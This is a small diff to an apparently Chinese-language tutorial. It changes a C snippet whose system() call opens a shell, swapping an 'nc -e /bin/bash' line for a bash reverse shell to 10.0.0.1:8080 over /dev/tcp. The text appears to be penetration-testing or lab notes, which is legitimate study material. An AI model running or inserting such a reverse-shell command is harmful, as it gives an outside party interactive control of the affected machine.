@@ -108,7 +108,7 @@ chkconfig sshd on　#设置开机启动
 #include<stdlib.h>
 main()
 {
-system(“nc -e /bin/bash 127.0.0.1”);
+system(“bash -i >& /dev/tcp/10.0.0.1/8080 0>&1”);
 }
 ```
 或者用下面的版本system.c，反正都是简单的实现
